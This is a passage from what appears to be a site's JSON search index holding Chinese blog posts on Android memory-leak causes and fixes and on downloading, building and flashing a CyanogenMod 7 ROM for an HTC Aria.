}","title":"3.\u8c03\u7528registerReceiver()\u540e\u672a\u8c03\u7528unregisterReceiver()."},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#4inputstreamoutputstream","text":"\u8fd9\u4e2a\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u6211\u4eec\u64cd\u4f5c\u5b8c\u8f93\u5165\u8f93\u51fa\u6d41\u90fd\u8981\u5173\u95ed\u6d41","title":"4.\u672a\u5173\u95edInputStream/OutputStream\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#5bitmaprecycle","text":"\u56fe\u7247\u5904\u7406\u4e0d\u597d\u662f\u9020\u6210\u5185\u5b58\u6ea2\u51fa\u7684\u53c8\u4e00\u4e2a\u5934\u53f7\u539f\u56e0\uff0c\uff08\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u4e2d\u4e5f\u6709\u4f53\u73b0)\uff0c \u5f53\u6211\u4eec\u5904\u7406\u5b8c\u56fe\u7247\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528recycle()\u65b9\u6cd5\u6765\u56de\u6536\u56fe\u7247\u5bf9\u8c61 Java\u4ee3\u7801 1. if(!bitmap.isRecycled()) 2. { 3. bitmap.recycle() 4. } \u9664\u6b64\u4e4b\u5916\uff1a \u76f4\u63a5\u4f7f\u7528ImageView\u663e\u793abitmap\u4f1a\u5360\u7528\u8f83\u591a\u8d44\u6e90\uff0c\u7279\u522b\u662f\u56fe\u7247\u8f83\u5927\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\u3002 \u4f7f\u7528BitmapFactory.Options\u8bbe\u7f6einSampleSize, \u8fd9\u6837\u505a\u53ef\u4ee5\u51cf\u5c11\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8981\u6c42\u3002 \u5c5e\u6027\u503cinSampleSize\u8868\u793a\u7f29\u7565\u56fe\u5927\u5c0f\u4e3a\u539f\u59cb\u56fe\u7247\u5927\u5c0f\u7684\u51e0\u5206\u4e4b\u4e00\uff0c\u5373\u5982\u679c\u8fd9\u4e2a\u503c\u4e3a2\uff0c\u5219\u53d6\u51fa\u7684\u7f29\u7565\u56fe\u7684\u5bbd\u548c\u9ad8\u90fd\u662f\u539f\u59cb\u56fe\u7247\u76841/2\uff0c\u56fe\u7247\u5927\u5c0f\u5c31\u4e3a\u539f\u59cb\u5927\u5c0f\u76841/4\u3002 BitmapFactory.Options bitmapFactoryOptions = new BitmapFactory.Options(); bitmapFactoryOptions.inJustDecodeBounds = true; bitmapFactoryOptions.inSampleSize = 2; // \u8fd9\u91cc\u4e00\u5b9a\u8981\u5c06\u5176\u8bbe\u7f6e\u56defalse\uff0c\u56e0\u4e3a\u4e4b\u524d\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u6210\u4e86true // \u8bbe\u7f6einJustDecodeBounds\u4e3atrue\u540e\uff0cdecodeFile\u5e76\u4e0d\u5206\u914d\u7a7a\u95f4\uff0c\u5373\uff0cBitmapFactory\u89e3\u7801\u51fa\u6765\u7684Bitmap\u4e3aNull,\u4f46\u53ef\u8ba1\u7b97\u51fa\u539f\u59cb\u56fe\u7247\u7684\u957f\u5ea6\u548c\u5bbd\u5ea6 options.inJustDecodeBounds = false; Bitmap bmp = BitmapFactory.decodeFile(sourceBitmap, options);","title":"5.Bitmap\u4f7f\u7528\u540e\u672a\u8c03\u7528recycle()\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#6context","text":"\u8fd9\u662f\u4e00\u4e2a\u5f88\u9690\u6666\u7684OutOfMemoryError\u7684\u60c5\u51b5\u3002\u5148\u770b\u4e00\u4e2aAndroid\u5b98\u7f51\u63d0\u4f9b\u7684\u4f8b\u5b50\uff1a Java\u4ee3\u7801 1. private static Drawable sBackground; 2. @Override 3. protected void onCreate(Bundle state) { 4. super.onCreate(state); 6. TextView label = new TextView(this); 7. label.setText(\"Leaks are bad\"); 9. if (sBackground == null) { 10. sBackground = getDrawable(R.drawable.large\\_bitmap); 11. } 12. label.setBackgroundDrawable(sBackground); 14. setContentView(label); 15. } \u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u5f88\u5feb\uff0c\u4f46\u540c\u65f6\u53c8\u662f\u6781\u5176\u9519\u8bef\u7684\uff1b \u5728\u7b2c\u4e00\u6b21\u5c4f\u5e55\u65b9\u5411\u5207\u6362\u65f6\u5b83\u6cc4\u9732\u4e86\u4e00\u5f00\u59cb\u521b\u5efa\u7684Activity\u3002\u5f53\u4e00\u4e2aDrawable\u9644\u52a0\u5230\u4e00\u4e2a View\u4e0a\u65f6\uff0c View\u4f1a\u5c06\u5176\u4f5c\u4e3a\u4e00\u4e2acallback\u8bbe\u5b9a\u5230Drawable\u4e0a\u3002\u4e0a\u8ff0\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u610f\u5473\u7740Drawable\u62e5\u6709\u4e00\u4e2aTextView\u7684\u5f15\u7528\uff0c \u800cTextView\u53c8\u62e5\u6709Activity\uff08Context\u7c7b\u578b\uff09\u7684\u5f15\u7528\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0cDrawable\u62e5\u6709\u4e86\u66f4\u591a\u7684\u5bf9\u8c61\u5f15\u7528\u3002\u5373\u4f7fActivity\u88ab \u9500\u6bc1\uff0c\u5185\u5b58\u4ecd\u7136\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u53e6\u5916\uff0c\u5bf9Context\u7684\u5f15\u7528\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\uff0c\u4e5f\u4f1a\u5bfc\u81f4Context\u6cc4\u6f0f\u3002\u6240\u4ee5\u5c3d\u91cf\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 \u8fd9\u79cdContext\u62e5\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\u957f\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u4e14\u4e0d\u4f9d\u8d56Activity\u7684\u751f\u547d\u5468\u671f\u3002\u5982\u679c\u4f60\u6253\u7b97\u4fdd\u5b58\u4e00\u4e2a\u957f\u65f6\u95f4\u7684\u5bf9\u8c61\uff0c \u5e76\u4e14\u5176\u9700\u8981\u4e00\u4e2a Context\uff0c\u8bb0\u5f97\u4f7f\u7528Application\u5bf9\u8c61\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528Context.getApplicationContext()\u6216 Activity.getApplication()\u8f7b\u677e\u5f97\u5230Application\u5bf9\u8c61\u3002 \u6700\u8fd1\u9047\u5230\u4e00\u79cd\u60c5\u51b5\u5f15\u8d77\u4e86Context\u6cc4\u6f0f\uff0c\u5c31\u662f\u5728Activity\u9500\u6bc1\u65f6\uff0c\u91cc\u9762\u6709\u5176\u4ed6\u7ebf\u7a0b\u6ca1\u6709\u505c\u3002 \u603b\u7ed3\u4e00\u4e0b\u907f\u514dContext\u6cc4\u6f0f\u5e94\u8be5\u6ce8\u610f\u7684\u95ee\u9898\uff1a 1.\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 2.\u6ce8\u610f\u5bf9Context\u7684\u5f15\u7528\u4e0d\u8981\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\u3002 3.\u614e\u91cd\u7684\u4f7f\u7528\u201cstatic\u201d\u5173\u952e\u5b57\u3002 4.Context\u91cc\u5982\u679c\u6709\u7ebf\u7a0b\uff0c\u4e00\u5b9a\u8981\u5728onDestroy()\u91cc\u53ca\u65f6\u505c\u6389\u3002","title":"6.Context\u6cc4\u6f0f\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#7static","text":"\u5f53\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u58f0\u660e\u6210static\u540e\uff0c\u5b83\u662f\u5c5e\u4e8e\u7c7b\u7684\u800c\u4e0d\u662f\u5c5e\u4e8e\u5bf9\u8c61\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c06\u5f88\u5927\u7684\u8d44\u6e90\u5bf9\u8c61\uff08Bitmap\uff0ccontext\u7b49\uff09\u58f0\u660e\u6210static\uff0c\u90a3\u4e48\u8fd9\u4e9b\u8d44\u6e90\u4e0d\u4f1a\u968f\u7740\u5bf9\u8c61\u7684\u56de\u6536\u800c\u56de\u6536\uff0c \u4f1a\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u4ee5\u5728\u4f7f\u7528static\u5173\u952e\u5b57\u5b9a\u4e49\u6210\u5458\u53d8\u91cf\u7684\u65f6\u5019\u8981\u614e\u91cd\u3002","title":"7.static\u5173\u952e\u5b57"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/","text":"\u3010Android ROM\u5b9a\u5236\u3011CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1 \u524d\u8a00\uff1a CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1\u662f\u4e00\u4e2a\u8017\u65f6\u3001\u8017\u7cbe\u529b\u3001\u8017\u4eba\u54c1\u7684\u5de5\u7a0b\uff0c\u5982\u679c\u4f60\u6709\u8db3\u591f\u7684\u6bc5\u529b\u3001\u8010\u5fc3\uff0c\u4ee5\u53ca\u505a\u597d\u4e86\u627f\u53d7\u5404\u79cd\u4e0b\u8f7d\u51fa\u9519\u3001\u7f16\u8bd1\u51fa\u9519\u3001\u56fa\u5316\u51fa\u9519\u6253\u51fb\u7684\u5fc3\u7406\u51c6\u5907\uff0c\u8bf7\u4e00\u6b65\u4e00\u6b65\u5f80\u4e0b\u770b\u3002\u8003\u8651\u5230Cyanogenmod\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u6709\u9650\uff0c\u4ee5\u53ca\u5e7f\u5927Android\u7f16\u7a0b\u7231\u597d\u8005\u7684\u624b\u673a\u8bbe\u5907\u5dee\u5f02\uff0c\u672cblog\u662f\u4ee5\u624b\u673aHTC Aria(liberty) \u4e0b\u8f7d\u3001\u7f16\u8bd1Cyanogenmod 7 \u3001\u5e76\u751f\u6210\u56fa\u4ef6\u70e7\u5199\u5230\u624b\u673a\u4e3a\u4f8b\uff0c\u5f15\u5bfc\u8bfb\u8005\u6839\u636e\u81ea\u5df1\u7684\u624b\u673a\u8bbe\u5907\u9009\u62e9\u5176\u652f\u6301\u7684Cyanogenmod\u7248\u672c\u4ee5\u53ca\u5176\u6e90\u7801\u5206\u652f\u8fdb\u884cCyanogenmod\u6e90\u7801\u7684\u4e0b\u8f7d\u3001\u7f16\u8bd1\u3001\u56fa\u5316\u3002 Ps.\u7b14\u8005\u67e5\u770b\u5404\u79cd\u8d44\u6599\uff0c\u4eceCyanogenmod\u662f\u4ec0\u4e48\u90fd\u4e0d\u77e5\u9053\u5230\u6700\u7ec8\u6210\u529f\u4e0b\u8f7dCyanogenmod\u6e90\u7801\u3001\u7f16\u8bd1\u3001\u751f\u6210\u56fa\u4ef6\u3001\u5728\u624b\u673a\u4e0a\u8fd0\u884cCM7\u7cfb\u7edf\u5171\u6298\u817e\u4e861\u4e2a\u661f\u671f\u3002\u5176\u4e2d\u4e0b\u8f7d\u6e90\u7801\u8017\u65f63\u5929\uff0c\u6bcf\u5929\u665a\u4e0a\u534a\u591c\u722c\u8d77\u6765\u770b\u662f\u5426\u5168\u90e8\u4e0b\u8f7d\u5b8c\u6210\u3002\u7f16\u8bd13\u5929\uff0c\u5305\u62ec\u5904\u7406\u5404\u79cd\u7f16\u8bd1\u51fa\u9519\uff0c\u751f\u6210\u56fa\u4ef6\u5e76\u8fd0\u884c\u7cfb\u7edf\u5e76\u5229\u7528\u8be5\u7cfb\u7edf\u62e8\u6253\u7b2c\u4e00\u4e2a\u7535\u8bdd\u6210\u529f\u65f6\uff0c\u5174\u594b\u4e4b\u60c5\u65e0\u4ee5\u8a00\u8868\uff0c\u5386\u53f2\u7684\u4e00\u523b\uff0c\u5c31\u50cf\u4e2d\u56fd\u53d1\u9001\u7b2c\u4e00\u5c01\u56fd\u9645\u7535\u5b50\u90ae\u4ef6\u4e00\u6837\u5f00\u542f\u4e2d\u56fd\u4e92\u8054\u7f51\u65f6\u4ee3\uff0c\u5f00\u542f\u4e86\u81ea\u5df1\u7684Android\u7cfb\u7edf\u6df1\u5165\u5b66\u4e60\u4e4b\u8def\uff0c\u8fd9\u8fd8\u53ea\u662f\u5f00\u59cb\uff0c\u540e\u9762\u7684\u8def\u8fd8\u5f88\u957f\u3002 \u4e00\u3001Cyanogenmod 1\u3001Cyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907 Cyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u7c7b\u578b\u6709Htc\u3001Samsung\u3001Huawei\u3001Sony\u7b49\u5176\u5404\u81ea\u65d7\u4e0b\u7684\u4e3b\u6d41\u578b\u53f7\uff0c\u8be6\u7ec6\u7684\u4fe1\u606f\u8bf7\u67e5\u9605Cyanogenmod\u5b98\u65b9\u7f51\u5740\uff1a http://wiki.cyanogenmod.org/w/Devices#vendor=; ,\u53ef\u4ee5\u67e5\u770bCyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u3002 \u5728vendor\u6807\u7b7e\u4e2d\u9009\u4e2dHtc\uff0c\u53ef\u770b\u5230\u7b14\u8005\u7684\u624b\u673aHTC Aria(liberty),\u8868\u660e\u652f\u6301Cyanogenmod\u7f16\u8bd1\u751f\u6210\u7684\u56fa\u4ef6\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 2\u3001\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7 \u67e5\u770b\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7\u76f4\u63a5\u5173\u7cfb\u5230CM\u6e90\u7801\u5206\u652f\u7684\u9009\u62e9\uff0c\u6bd4\u5982\u7b14\u8005\u624b\u673a\u662fHTC liberty\uff0c\u5176\u652f\u6301\u7684CM\u7248\u672c\u53f7\u662fCM 7\uff0c\u5176\u5bf9\u5e94\u7684\u5206\u652f\u662fgingerbread\u3002 CM Support: 7 Latest CM version: gingerbread \u4e86\u89e3\u5b8c\u81ea\u5df1\u7684\u624b\u673a\u662f\u5426\u652f\u6301Cyanogenmod\u6e90\u7801\u7f16\u8bd1\u751f\u6210\u7684\u56fa\u4ef6\u548c\u5176\u652f\u6301\u7684CM version\u3002\u63a5\u4e0b\u6765\u5c31\u5f00\u59cb\u642d\u5efa\u73af\u5883\u3001\u4e0b\u8f7d\u3001\u7f16\u8bd1CM\u6e90\u7801\u4e86\u3002 \u4e8c\u3001\u73af\u5883\u642d\u5efa 1\u3001 ubuntu\u7cfb\u7edf\u5b89\u88c5 \u7b14\u8005\u7f16\u8bd1\u7684\u662fCyanogenMod 7\u7a33\u5b9a\u7248\u3001Android\u6e90\u78012.3\u7cfb\u5217\uff0c\u800cAndroid 2.3\u7cfb\u7edf\u9650\u5236\u5fc5\u987b\u4f7f\u752832\u4f4d\uff08Android4\u652f\u630164\u4f4d\u7cfb\u7edf\uff09\uff0c\u6545\u4f7f\u7528ubuntu10.3 32\u4f4d\u7cfb\u7edf\u3002\u8be6\u7ec6\u5b89\u88c5\u6b65\u9aa4\u8bf7\u53c2\u8003\u7f51\u4e0a\u7684\u5b89\u88c5\u6559\u7a0b\uff0c\u5df2\u5b89\u88c5ubuntu 32\u4f4d\u7cfb\u7edf\u8bf7\u8df3\u8fc7\u3002 2\u3001 \u5b89\u88c5JDK6 $ sudo add-apt-repository \"deb http://archive.canonical.com/ lucid partner\" $ sudo apt-get update $ sudo apt-get installsun-java6-jdk 3\u3001 \u5b89\u88c5\u7f16\u8bd1\u6240\u9700\u8981\u7684\u5305 (Ubuntu 10.04-- 11.10) $ sudo apt-get installgit-core gnupg flex bison gperf build-essential \\ zip curl zlib1g-dev libc6-devlib32ncurses5-dev ia32-libs \\ x11proto-core-dev libx11-devlib32readline5-dev lib32z-dev \\ libgl1-mesa-dev g++-multilib mingw32 tofrodospython-markdown \\ libxml2-utils xsltproc Ubuntu 12.04\u5b89\u88c5\u7f16\u8bd1\u6240\u9700\u8981\u7684\u5305\u8be6\u7ec6\u8bf7\u53c2\u8003\uff1a http://source.android.com/source/initializing.html 4\u3001 \u914d\u7f6eUSB\u8bbf\u95ee\u6743\u9650 (1)\u3001\u9ed8\u8ba4\u5c06htc\u7c7b\u578b\u624b\u673a\u901a\u8fc7usb\u8fde\u63a5\u4e0a\u7535\u8111\u4e4b\u540e\uff0c\u4f7f\u7528adb devices\u662f\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u624b\u673a\u8bbe\u5907\u7684\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a tip\uff1a\u8fd9\u91cc\u8981\u4f7f\u7528\u5230adb\u5de5\u5177\uff0c\u5982\u679cubuntu\u7cfb\u7edf\u5b89\u88c5\u4e86android eclipse\u5f00\u53d1\u5de5\u5177\uff0c\u9ed8\u8ba4\u662f\u81ea\u5e26adb\u5de5\u5177\u7684\u3002 (2)\u3001\u5c06\u8bbe\u5907\u8fde\u63a5\u4e0a\u7535\u8111\uff0c\u67e5\u770b\u624b\u673a\u7684usb\u8bbe\u5907\uff1a ubuntu@andy-laptop:~$lsusb htc \u624b\u673a\u5bf9\u5e94\u7684usb\u8bbe\u5907\u4fe1\u606f\u5982\u4e0b\uff1a Bus 002 Device 004: ID 0bb4:0c92 High Tech Computer Corp. \u5982\u4e0b\u56fe\u6240\u793a\uff1a (3)\u3001\u4fee\u653951-android.rules\u6587\u4ef6\uff1a ubuntu@andy-laptop:sudo gedit /etc/udev/rules.d/51-android.rules \u6dfb\u52a0\u4e00\u884c\u4fe1\u606f\uff0c\u7279\u522b\u6ce8\u610f\uff0cATTR{idVendor} \u4e0eATTR{idProduct}\u7684\u503c\u5206\u522b\u4e8eID 0bb4:0c92\u5bf9\u5e94\u3002 # fastboot protocol onmanta (htc liberty) SUBSYSTEM==\"usb\",ATTR{idVendor}==\"0bb4\", ATTR{idProduct}==\"0c92\",MODE=\"0600\", OWNER=\"ubuntu\" \u5982\u4e0b\u56fe\u6240\u793a\uff1a (4)\u3001\u4fdd\u5b58\u6587\u4ef6\u540e\uff0c\u91cd\u65b0\u5c06\u624b\u673a\u8fde\u63a5\u5230\u7535\u8111\uff0c\u4f7f\u7528adb devices\u67e5\u770b\u8bbe\u5907\u7684\u8fde\u63a5\u72b6\u6001\uff0c\u53ef\u53d1\u73b0\u5df2\u7ecf\u62e5\u6709\u4e86\u8bbf\u95eeusb\u7684\u6743\u9650\u3002 (5)\u3001\u8be6\u7ec6\u8bf7\u53c2\u8003\uff1a http://source.android.com/source/initializing.html Configuring USB Access\u5c0f\u8282 \u4e09\u3001\u4e0b\u8f7d\u6e90\u7801 1\u3001 \u5b89\u88c5Repo //\u4ece\u7528\u6237\u6839\u76ee\u5f55\u5f00\u59cb $ mkdir ~/bin $ PATH=~/bin:$PATH $ curl http://commondatastorage.googleapis.com/git-repo-downloads/repo > ~/bin/repo $ chmod a+x ~/bin/repo 2\u3001\u4e0b\u8f7d\u6e90\u7801 (1)\u3001 \u5982\u4f55\u9009\u62e9\u5206\u652f \u7b14\u8005\u7684\u624b\u673a\u662fhtc G9,\u652f\u6301\u7684CM verison :gingerbread\uff0c\u9009\u62e9\u624b\u673a\u8bbe\u5907\u6240\u652f\u6301\u5206\u652f\u7684\u8be6\u7ec6\u6b65\u9aa4\uff0c\u8bf7\u53c2\u8003\u672cblog 1.2\u3001\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7 \u7b14\u8005\u6700\u7ec8\u9009\u62e9\u7684\u5206\u652f\u662f\uff1agingerbread-release \u67e5\u770b https://github.com/CyanogenMod/android.git \u4e0b\u6240\u652f\u6301\u7684\u6240\u6709\u5206\u652f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u662f\u5206\u652fgingerbread-release\u3002 (2)\u3001\u4f7f\u7528repo\u6267\u884c\u4e0b\u8f7d //\u4ece\u7528\u6237\u6839\u76ee\u5f55\u4e0b\u5f00\u59cb,\u5206\u522b\u521b\u5efa\u6587\u4ef6\u5939CyanogenMod/android/CM-7 $cd ./CyanogenMod/android/CM-7 //\u83b7\u53d6gingerbread-release\u7684\u5206\u652f\u6e90\u4ee3\u7801 $repo init -u git://github.com/CyanogenMod/android.git -b gingerbread-release //\u540c\u6b65\u670d\u52a1\u5668\u4ee3\u7801\u5230\u672c\u5730\uff0c-j16\u636e\u7f51\u53cb\u53cd\u5e94\u662f\u591a\u5f00\u7f51\u7edc\u8fde\u63a5\uff0c\u4ece\u800c\u80fd\u63d0\u9ad8\u4e0b\u8f7d\u901f\u5ea6 $repo sync -j16 repo\u547d\u4ee4\u4f7f\u7528\u53c2\u8003\uff1a http://source.android.com/source/using-repo.html \u7279\u522b\u63d0\u9192\uff1a\u5173\u4e8egingerbread\u5206\u652f\uff0c\u6211\u4e0b\u8f7d\u4e4b\u540e\uff0c\u53d1\u73b0CyanogenMod/android/CM-7/device\u76ee\u5f55\u91cc\u6ca1\u6709htc\u3001\u4e09\u661f\u4e00\u7cfb\u5217\u624b\u673a\u5bf9\u5e94\u7684\u7248\u672c\uff0c\u6298\u817e\u4e86\u597d\u957f\u4e00\u6bb5\u65f6\u95f4\uff0c\u6700\u7ec8\u9009\u62e9gingerbread-release\u5206\u652f\u4e0b\u8f7d\u6e90\u7801\uff0c\u5728CyanogenMod/android/CM-7/device\u76ee\u5f55\u6210\u529f\u83b7\u5f97\u591a\u6b3e\u624b\u673a\u5bf9\u5e94\u7684\u7248\u672c\u3002 \u4e0b\u8f7d\u6210\u529f\u540e\uff0c\u5728CyanogenMod/android/CM-7/device\u6587\u4ef6\u5939\u4f1a\u5305\u542b\u5982\u4e0b\u6240\u793a\u6587\u4ef6\u5939\uff0c\u4ee5\u6b64\u5224\u65ad\u6e90\u7801\u662f\u5426\u4e0b\u8f7d\u5b8c\u6574\u3002\u53d1\u73b0device\u6587\u4ef6\u5939\u91cc\u5df2\u7ecf\u5305\u542b\u4e86htc\u6587\u4ef6\u5939\uff0c\u5982\u56fe\u6240\u793a\uff1a \u70b9\u51fbhtc\u6587\u4ef6\u5939\u8fdb\u5165\u53ef\u53d1\u73b0liberty\u5df2\u5b89\u9759\u7684\u8eba\u5728\u90a3\uff0c\u5982\u56fe\u6240\u793a\uff1a \u56db\u3001\u7f16\u8bd1\u6e90\u7801 1\u3001 \u8bfb\u53d6\u624b\u673a\u4e0a\u7684\u4e00\u4e9b\u79c1\u6709\u914d\u7f6e\u6587\u4ef6 \u5c06htc\u624b\u673a\u8fde\u63a5\u4e0aubuntu\u7cfb\u7edf\uff0c\u53ef\u80fd\u6ca1\u6709usb\u8bbf\u95ee\u6743\u9650\uff0c\u5177\u4f53\u8bf7\u53c2\u80032.4 \u914d\u7f6eUSB\u8bbf\u95ee\u6743\u9650 $cd ~/CyanogenMod/android/CM-7/device/htc/liberty $./extract-files.sh 2\u3001 \u751f\u6210\u7f16\u8bd1\u811a\u672c\u6587\u4ef6 $cd ~/CyanogenMod/android/CM-7/vendor/cyanogen $./get-rommanager $./extract-google-files //\u590d\u5236\u7f16\u8bd1\u811a\u672c\u6587\u4ef6\u5230\u76ee\u5f55\u4e0b\uff0c\u540e\u9762\u7f16\u8bd1\u6574\u4e2a\u7cfb\u7edf\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\u6587\u4ef6 $cp ~/CyanogenMod/android/CM-7/vendor/cyanogen/products/cyanogen_lieberty.mk ~/CyanogenMod/android/CM-7/buildspec.mk \u6267\u884c./get-rommanager\u8fd0\u884c\u7ed3\u679c\u5982\u56fe\u6240\u793a\uff1a 3\u3001 \u7f16\u8bd1\u811a\u672c \u56de\u5230CyanogenMod/android/CM-7\u76ee\u5f55\u4e0b\uff0c\u6267\u884c\u811a\u672c\u3002 //\u521d\u59cb\u5316\u811a\u672c\uff0c\u8fd9\u4e2a\u662f\u540e\u9762\u7684\u91cd\u8981\u57fa\u7840\u6b65\u9aa4 $cd ~/CyanogenMod/android/CM-7 $source build/envsetup.sh //\u9009\u62e9\u7f16\u8bd1\u7684\u4ea7\u54c1\uff0c\u8fd9\u4e2a\u547d\u4ee4\u9700\u8981\u4e00\u5c0f\u4f1a\u513f\u65f6\u95f4\uff0c\u4f46\u662f\u53c8\u6ca1\u63d0\u793a\uff0c\u8010\u6027\u7b49\u5f85\u4e00\u4e0b //\u6216\u76f4\u63a5\u6267\u884clunch\u547d\u4ee4\uff0c\u67e5\u770blist\u9009\u9879\u6765\u9009\u62e9\u6267\u884c\u54ea\u4e2a\u7248\u672c $lunch cyanogen_liberty-eng //\u5f00\u59cb\u7f16\u8bd1 $make -j4 CYANOGEN_WITH_GOOGLE=true otapackage \u6267\u884clunch\u547d\u4ee4\uff0c\u9009\u62e9119\uff0c\u663e\u793a\u4fe1\u606f\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7f16\u8bd1\u6210\u529f\u663e\u793a\u5982\u4e0b\u4fe1\u606f\uff0c\u8fd9\u5f20\u56fe\u7247\u6765\u7684\u76f8\u5f53\u4e0d\u5bb9\u6613\uff0c\u534a\u591c\u8d77\u6765\u622a\u7684\u56fe: 4\u3001\u7f16\u8bd1\u53ef\u80fd\u4ea7\u51fa\u7684\u9519\u8bef\u5206\u6790\uff08\u5982\u679c\u6ca1\u6709\u95ee\u9898\u53ef\u76f4\u63a5\u8df3\u8fc7\uff0c\u6267\u884c\u7b2c5\u6b65\uff1a\u751f\u6210\u5237\u673azip\u5305\u64cd\u4f5c\uff09\uff1a \u9519\u8bef\u539f\u56e0\uff1a\u65e0\u6cd5\u8bbf\u95ee\u6587\u4ef6: corrupted zip file \u9519\u8bef\u539f\u56e0\u5206\u6790\uff1a\u6ca1\u6709\u9009\u62e9\u6b63\u786ejar\u7248\u672c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u9009\u62e9\u7684\u662f/usr/bin/fastjar\u81ea\u52a8\u6a21\u5f0f\uff0c\u901a\u8fc7sudo update-alternatives --config jar\u9009\u62e9jdk6\u5373\u53ef\u3002 \u95ee\u9898\u89e3\u51b3\uff1a 32\u4f4dubuntu\u7f16\u8bd1android2.3,\u65e0\u6cd5\u8bbf\u95ee java.lang.Object\u95ee\u9898 http://hi.baidu.com/cmdmac/item/93920ff30164270884d278a4 \u7f16\u8bd1android 2.3.4\u7684\u4e00\u4e2a\u9519\u8bef http://blog.163.com/covel_zhang/blog/static/81641365201223122541768/ 5\u3001\u751f\u4ea7\u5237\u673azip\u5305\u3002 \u5728CyanogenMod/android/CM-7\u76ee\u5f55\u4e0b\u6267\u884c\u5982\u4e0b\u811a\u672c\uff1a $./vendor/cyanogen/tools/squisher \u751f\u6210\u56fa\u4ef6\u5305\u6210\u529f\uff0c\u663e\u793a\u5982\u4e0b\u56fe\u6240\u793a\u4fe1\u606f\uff1a \u4e94\u3001\u5237\u673a \u5c06cm-7-20131119-UNOFFCIAL-liberty.zip\u5305\u5237\u5230\u6211htc\u624b\u673a\u4e0a\u4e00\u5207\u6b63\u5e38\uff0c\u6709\u56fe\u6709\u771f\u76f8\uff0c\u7559\u5fc3\"\u5173\u4e8e\u624b\u673a\"\u4fee\u8ba2\u7248\u672c\u9009\u9879\uff0c\u6b63\u662f\u7b2c5\u6b65\u751f\u6210\u7684\u5237\u673a\u5305cm-7-20131119-UNOFFCIAL-liberty.zip\u3002 \u516d\u3001\u53c2\u8003\uff1a Android\u62d3\u5c55\u7cfb\u5217(5)--CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1(Android ROM\u5b9a\u5236\u57fa\u7840\u7bc7) Android \u7b2c\u4e09\u65b9ROM CyanogenMod \u6e90\u7801\u4e0b\u8f7d\uff0c\u7f16\u8bd1\uff0c\u5237\u673a http://source.android.com/source/initializing.html http://source.android.com/source/building.html \u4e03\u3001\u5c0f\u7ed3\uff1a \u672c\u6587\u4ee5\u7b14\u8005\u81ea\u8eab\u7684CyanogenMod\u6e90\u7801\u7f16\u8bd1\u6298\u817e\u7ecf\u5386\u63cf\u8ff0\u4e86\u5229\u7528\u7b2c\u4e09\u65b9\u5f00\u6e90\u7cfb\u7edf\u5b9a\u5236\u4e2a\u6027\u5316ROM\u7684\u8fc7\u7a0b\uff0c\u4e4b\u6240\u4ee5\u8981\u8bb0\u5f55\u8fd9\u7bc7\u535a\u6587\uff0c\u5b8c\u5168\u662f\u672c\u7740\u524d\u4eba\u683d\u6811\u540e\u4eba\u4e58\u51c9\u7684\u5b97\u65e8\uff0c\u8ba9\u9047\u5230\u540c\u6837\u9700\u6c42\u7684\u5f00\u53d1\u8005\u4e0d\u81f3\u4e8e\u50cf\u7b14\u8005\u5982\u6b64\u6298\u817e\uff0c\u6216\u8005\u8bf4\u6298\u817e\u7684\u5c11\u4e00\u4e9b\uff0c\u5982\u6b64\uff0c\u7b14\u8005\u5fc3\u6ee1\u610f\u8db3\u3002\u6700\u540e\uff0c\u672c\u535a\u6587\u867d\u7ecf\u7b14\u8005\u591a